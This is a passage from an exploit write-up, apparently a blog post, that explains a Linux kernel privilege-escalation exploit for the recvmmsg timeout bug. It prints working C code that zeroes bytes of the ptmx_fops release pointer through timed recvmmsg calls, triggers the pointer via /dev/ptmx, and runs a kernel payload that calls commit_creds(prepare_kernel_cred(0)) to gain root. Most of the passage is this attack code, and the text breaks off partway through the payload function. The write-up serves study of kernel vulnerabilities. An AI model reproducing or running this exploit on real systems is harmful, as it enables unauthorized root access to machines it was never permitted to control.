<p>The first thing the exploit does is allocate executable and writable memory at a fixed address. TTY_RELEASE is the original value of the targeted pointer in kernel space. Since the three most significant bytes of that pointer will be cleared, a mask of 0x000000fffffff000 has to be applied to it.<br>
The memory region is then filled with nops and the kernel payload (discussed later) is copied into it.</p>
<h3>The target</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-c1">/*</span></div></div><div class=""><div><span class="enlighter-c1"> * Now clear the three most significant bytes of the fops pointer</span></div></div><div class=""><div><span class="enlighter-c1"> * to the release function.</span></div></div><div class=""><div><span class="enlighter-c1"> * This will make it point into the memory region mapped above.</span></div></div><div class=""><div><span class="enlighter-c1"> */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"changing kernel pointer to point into controlled buffer...\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">target = PTMX_FOPS + FOPS_RELEASE_OFFSET;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">3</span><span class="enlighter-text">; i++</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pids</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = </span><span class="enlighter-m0">fork</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pids</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text"> == </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">zero_out</span><span class="enlighter-g1">(</span><span class="enlighter-text">target + </span><span class="enlighter-g1">(</span><span class="enlighter-n1">5</span><span class="enlighter-text"> + i</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_SUCCESS</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">sleep</span><span class="enlighter-g1">(</span><span class="enlighter-n1">1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">/*
 * Now clear the three most significant bytes of the fops pointer
 * to the release function.
 * This will make it point into the memory region mapped above.
 */
printf("changing kernel pointer to point into controlled buffer...\n");
target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
for (i = 0; i &lt; 3; i++) {
    pids[i] = fork();
    if (pids[i] == 0) {
        zero_out(target + (5 + i));
        exit(EXIT_SUCCESS);
    }
    sleep(1);
}</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">/*
 * Now clear the three most significant bytes of the fops pointer
 * to the release function.
 * This will make it point into the memory region mapped above.
 */
printf("changing kernel pointer to point into controlled buffer...\n");
target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
for (i = 0; i &lt; 3; i++) {
    pids[i] = fork();
    if (pids[i] == 0) {
        zero_out(target + (5 + i));
        exit(EXIT_SUCCESS);
    }
    sleep(1);
}</pre>
<p>The pointer targeted in the exploit is the release function pointer of the ptmx_fops structure, which originally points to tty_release. In the Linux kernel the file_operations structure contains a bunch of function pointers to be executed when user space accesses the associated file. Examples include open, release, write, … ptmx_fops-&gt;release is called when the last reference to that file descriptor is released. The two pointers following release are not initialized (= 0) and will thus be valid tv_nsec values. The situation is then similar to the one depicted in the diagram shown in the “Exploitation Vector” section. User space can map 0x000000ffxxxxxxxx, meaning only 3 of the 4 high order bytes of the pointer need to be cleared. To speed things up three additional processes are forked, each one clearing a byte of the pointer. (Note: The sleep(1) between each fork is done here to guarantee a different seed for srand() in each child. This is needed so every child opens a different UDP port.)</p>
<h3>Exploiting the bug</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">void </span><span class="enlighter-m0">zero_out</span><span class="enlighter-g1">(</span><span class="enlighter-text">long addr</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    int sockfd, retval, port, pid, i;</span></div></div><div class=""><div><span class="enlighter-text">    struct sockaddr_in sa;</span></div></div><div class=""><div><span class="enlighter-text">    char buf</span><span class="enlighter-g1">[</span><span class="enlighter-text">BUFSIZE</span><span class="enlighter-g1">]</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    struct mmsghdr msgs;</span></div></div><div class=""><div><span class="enlighter-text">    struct iovec iovecs;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">srand</span><span class="enlighter-g1">(</span><span class="enlighter-m0">time</span><span class="enlighter-g1">(</span><span class="enlighter-k1">NULL</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    port = </span><span class="enlighter-n1">1024</span><span class="enlighter-text"> + </span><span class="enlighter-g1">(</span><span class="enlighter-m0">rand</span><span class="enlighter-g1">()</span><span class="enlighter-text"> % </span><span class="enlighter-g1">(</span><span class="enlighter-n2">0x10000</span><span class="enlighter-text"> - </span><span class="enlighter-n1">1024</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    sockfd = </span><span class="enlighter-m0">socket</span><span class="enlighter-g1">(</span><span class="enlighter-text">AF_INET, SOCK_DGRAM, </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">sockfd == </span><span class="enlighter-n1">-1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"socket()"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    sa.</span><span class="enlighter-m3">sin_family</span><span class="enlighter-text">      = AF_INET;</span></div></div><div class=""><div><span class="enlighter-text">    sa.</span><span class="enlighter-m3">sin_addr</span><span class="enlighter-text">.</span><span class="enlighter-m3">s_addr</span><span class="enlighter-text"> = </span><span class="enlighter-m0">htonl</span><span class="enlighter-g1">(</span><span class="enlighter-text">INADDR_LOOPBACK</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    sa.</span><span class="enlighter-m3">sin_port</span><span class="enlighter-text">        = </span><span class="enlighter-m0">htons</span><span class="enlighter-g1">(</span><span class="enlighter-text">port</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">bind</span><span class="enlighter-g1">(</span><span class="enlighter-text">sockfd, </span><span class="enlighter-g1">(</span><span class="enlighter-text">struct sockaddr *</span><span class="enlighter-g1">)</span><span class="enlighter-text"> &amp;sa, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">sa</span><span class="enlighter-g1">))</span><span class="enlighter-text"> == </span><span class="enlighter-n1">-1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"bind()"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;msgs, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">msgs</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    iovecs.</span><span class="enlighter-m3">iov_base</span><span class="enlighter-text">         = buf;</span></div></div><div class=""><div><span class="enlighter-text">    iovecs.</span><span class="enlighter-m3">iov_len</span><span class="enlighter-text">          = BUFSIZE;</span></div></div><div class=""><div><span class="enlighter-text">    msgs.</span><span class="enlighter-m3">msg_hdr</span><span class="enlighter-text">.</span><span class="enlighter-m3">msg_iov</span><span class="enlighter-text">    = &amp;iovecs;</span></div></div><div class=""><div><span class="enlighter-text">    msgs.</span><span class="enlighter-m3">msg_hdr</span><span class="enlighter-text">.</span><span class="enlighter-m3">msg_iovlen</span><span class="enlighter-text"> = </span><span class="enlighter-n1">1</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/*</span></div></div><div class=""><div><span class="enlighter-c1">     * start a separate process to send a UDP message after 255 seconds so the syscall returns,</span></div></div><div class=""><div><span class="enlighter-c1">     * but not after updating the timeout struct and writing the remaining time into it.</span></div></div><div class=""><div><span class="enlighter-c1">     * 0xff - 255 seconds = 0x00</span></div></div><div class=""><div><span class="enlighter-c1">     */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"clearing byte at 0x%lx\n"</span><span class="enlighter-text">, addr</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pid = </span><span class="enlighter-m0">fork</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pid == </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">buf, </span><span class="enlighter-n2">0x41</span><span class="enlighter-text">, BUFSIZE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">sockfd = </span><span class="enlighter-m0">socket</span><span class="enlighter-g1">(</span><span class="enlighter-text">AF_INET, SOCK_DGRAM, IPPROTO_UDP</span><span class="enlighter-g1">))</span><span class="enlighter-text"> == </span><span class="enlighter-n1">-1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"socket()"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        sa.</span><span class="enlighter-m3">sin_family</span><span class="enlighter-text">      = AF_INET;</span></div></div><div class=""><div><span class="enlighter-text">        sa.</span><span class="enlighter-m3">sin_addr</span><span class="enlighter-text">.</span><span class="enlighter-m3">s_addr</span><span class="enlighter-text"> = </span><span class="enlighter-m0">htonl</span><span class="enlighter-g1">(</span><span class="enlighter-text">INADDR_LOOPBACK</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        sa.</span><span class="enlighter-m3">sin_port</span><span class="enlighter-text">        = </span><span class="enlighter-m0">htons</span><span class="enlighter-g1">(</span><span class="enlighter-text">port</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">sleep</span><span class="enlighter-g1">(</span><span class="enlighter-n2">0xfe</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"waking up parent...\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">sendto</span><span class="enlighter-g1">(</span><span class="enlighter-text">sockfd, buf, BUFSIZE, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, &amp;sa, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">sa</span><span class="enlighter-g1">))</span><span class="enlighter-text">;                           </span><span class="enlighter-c1">/* -1- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_SUCCESS</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"> </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pid </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        retval = </span><span class="enlighter-m0">syscall</span><span class="enlighter-g1">(</span><span class="enlighter-text">__NR_recvmmsg, sockfd, &amp;msgs, </span><span class="enlighter-n1">1</span><span class="enlighter-text">, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, </span><span class="enlighter-g1">(</span><span class="enlighter-k1">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">addr</span><span class="enlighter-g1">)</span><span class="enlighter-text">;          </span><span class="enlighter-c1">/* -2- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">retval == </span><span class="enlighter-n1">-1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"address can't be written to, not a valid timespec struct!\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">waitpid</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"byte zeroed out\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"> </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"fork()"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">void zero_out(long addr)
{
    int sockfd, retval, port, pid, i;
    struct sockaddr_in sa;
    char buf[BUFSIZE];
    struct mmsghdr msgs;
    struct iovec iovecs;
    srand(time(NULL));
    port = 1024 + (rand() % (0x10000 - 1024));
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons(port);
    if (bind(sockfd, (struct sockaddr *) &amp;sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }
    memset(&amp;msgs, 0, sizeof(msgs));
    iovecs.iov_base         = buf;
    iovecs.iov_len          = BUFSIZE;
    msgs.msg_hdr.msg_iov    = &amp;iovecs;
    msgs.msg_hdr.msg_iovlen = 1;
    /*
     * start a separate process to send a UDP message after 255 seconds so the syscall returns,
     * but not after updating the timeout struct and writing the remaining time into it.
     * 0xff - 255 seconds = 0x00
     */
    printf("clearing byte at 0x%lx\n", addr);
    pid = fork();
    if (pid == 0) {
        memset(buf, 0x41, BUFSIZE);
        if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            perror("socket()");
            exit(EXIT_FAILURE);
        }
        sa.sin_family      = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port        = htons(port);
        sleep(0xfe);
        printf("waking up parent...\n");
        sendto(sockfd, buf, BUFSIZE, 0, &amp;sa, sizeof(sa));                           /* -1- */
        exit(EXIT_SUCCESS);
    } else if (pid &gt; 0) {
        retval = syscall(__NR_recvmmsg, sockfd, &amp;msgs, 1, 0, (void*)addr);          /* -2- */
        if (retval == -1) {
            printf("address can't be written to, not a valid timespec struct!\n");
            exit(EXIT_FAILURE);
        }
        waitpid(pid, 0, 0);
        printf("byte zeroed out\n");
    } else {
      perror("fork()");
      exit(EXIT_FAILURE);
    }
}</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">void zero_out(long addr)
{
    int sockfd, retval, port, pid, i;
    struct sockaddr_in sa;
    char buf[BUFSIZE];
    struct mmsghdr msgs;
    struct iovec iovecs;
    srand(time(NULL));
    port = 1024 + (rand() % (0x10000 - 1024));
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons(port);
    if (bind(sockfd, (struct sockaddr *) &amp;sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }
    memset(&amp;msgs, 0, sizeof(msgs));
    iovecs.iov_base         = buf;
    iovecs.iov_len          = BUFSIZE;
    msgs.msg_hdr.msg_iov    = &amp;iovecs;
    msgs.msg_hdr.msg_iovlen = 1;
    /*
     * start a separate process to send a UDP message after 255 seconds so the syscall returns,
     * but not after updating the timeout struct and writing the remaining time into it.
     * 0xff - 255 seconds = 0x00
     */
    printf("clearing byte at 0x%lx\n", addr);
    pid = fork();
    if (pid == 0) {
        memset(buf, 0x41, BUFSIZE);
        if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            perror("socket()");
            exit(EXIT_FAILURE);
        }
        sa.sin_family      = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port        = htons(port);
        sleep(0xfe);
        printf("waking up parent...\n");
        sendto(sockfd, buf, BUFSIZE, 0, &amp;sa, sizeof(sa));                           /* -1- */
        exit(EXIT_SUCCESS);
    } else if (pid &gt; 0) {
        retval = syscall(__NR_recvmmsg, sockfd, &amp;msgs, 1, 0, (void*)addr);          /* -2- */
        if (retval == -1) {
            printf("address can't be written to, not a valid timespec struct!\n");
            exit(EXIT_FAILURE);
        }
        waitpid(pid, 0, 0);
        printf("byte zeroed out\n");
    } else {
      perror("fork()");
      exit(EXIT_FAILURE);
    }
}</pre>
<p>This is the key part of the exploit, we’re abusing the bug as discussed in the “Exploitation Vector” section. After a lot of code to set up the structures needed for the syscall, the passed address is used as the least significant byte of the timeout pointer (-2-) and the vulnerable syscall is called.<br>
At -2- the forked child process will wake its parent so the time difference between the syscall and the incoming packet is between 254 and 255 seconds, thus setting the least significant byte of the tv_sec member to 0.<br>
Keep in mind that this function is executed by three child processes. The memory at the address of ptmx_fops-&gt;release roughly looks like this at the beginning:</p>
<pre style="font-family: monospace; font-size: 12px;">     release pointer             uninitialized            uninitialized
+-------------------------+-------------------------+-------------------------+
| c0 fe 42 81 ff ff ff ff | 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 |
+-------------------------+-------------------------+-------------------------+
                       ^ address for child 3
                    ^ address for child 2
                 ^ address for child 1</pre>
<p>Turning it into:</p>
<pre style="font-family: monospace; font-size: 12px;">     release pointer               mangled                  mangled
+-------------------------+-------------------------+-------------------------+
| c0 fe 42 81 ff 00 00 00 | 00 00 00 00 00 xx xx xx | xx xx xx 00 00 00 00 00 |
+-------------------------+-------------------------+-------------------------+</pre>
<p>ptmx_fops-&gt;release now points into the memory region that was mapped at the beginning.</p>
<h3>Code execution in Ring 0</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-c1">/* ... and trigger. */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"releasing file descriptor to call manipulated pointer in kernel mode...\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">pwn = </span><span class="enlighter-m0">open</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"/dev/ptmx"</span><span class="enlighter-text">, </span><span class="enlighter-s0">'r'</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">close</span><span class="enlighter-g1">(</span><span class="enlighter-text">pwn</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">/* ... and trigger. */
printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
pwn = open("/dev/ptmx", 'r');
close(pwn);</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">/* ... and trigger. */
printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
pwn = open("/dev/ptmx", 'r');
close(pwn);</pre>
<p>At this point we are ready to execute our payload in ring 0 by opening a file descriptor to /dev/ptmx and immediately closing it, causing the kernel to call ptmx_fops-&gt;release in the current context.<br>
Now if all goes well (see restrictions further down) the kernel will jump to our code, change the creds structure of our process to a new one with root privileges (and all capabilities) and return to user mode.<br>
Let’s take a closer look at how that is done next.</p>
<h3>Kernel payload</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">int </span><span class="enlighter-m0">__attribute__</span><span class="enlighter-g1">((</span><span class="enlighter-m0">regparm</span><span class="enlighter-g1">(</span><span class="enlighter-n1">3</span><span class="enlighter-g1">)))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">kernel_payload</span><span class="enlighter-g1">(</span><span class="enlighter-k1">void</span><span class="enlighter-text">* foo, </span><span class="enlighter-k1">void</span><span class="enlighter-text">* bar</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    _commit_creds commit_creds = </span><span class="enlighter-g1">(</span><span class="enlighter-text">_commit_creds</span><span class="enlighter-g1">)</span><span class="enlighter-text">COMMIT_CREDS;</span></div></div><div class=""><div><span class="enlighter-text">    _prepare_kernel_cred prepare_kernel_cred = </span><span class="enlighter-g1">(</span><span class="enlighter-text">_prepare_kernel_cred</span><span class="enlighter-g1">)</span><span class="enlighter-text">PREPARE_KERNEL_CRED;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* restore function pointer and following two longs */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">int*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">PTMX_FOPS + FOPS_RELEASE_OFFSET + </span><span class="enlighter-n1">4</span><span class="enlighter-g1">))</span><span class="enlighter-text"> = </span><span class="enlighter-n1">-1</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">long*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">PTMX_FOPS + FOPS_RELEASE_OFFSET + </span><span class="enlighter-n1">8</span><span class="enlighter-g1">))</span><span class="enlighter-text"> = </span><span class="enlighter-n1">0</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">long*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">PTMX_FOPS + FOPS_RELEASE_OFFSET + </span><span class="enlighter-n1">16</span><span class="enlighter-g1">))</span><span class="enlighter-text"> = </span><span class="enlighter-n1">0</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* escalate to root */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">commit_creds</span><span class="enlighter-g1">(</span><span class="enlighter-m0">prepare_kernel_cred</span><span class="enlighter-g1">(</span><span class="enlighter-n1">0</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-n1">-1</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
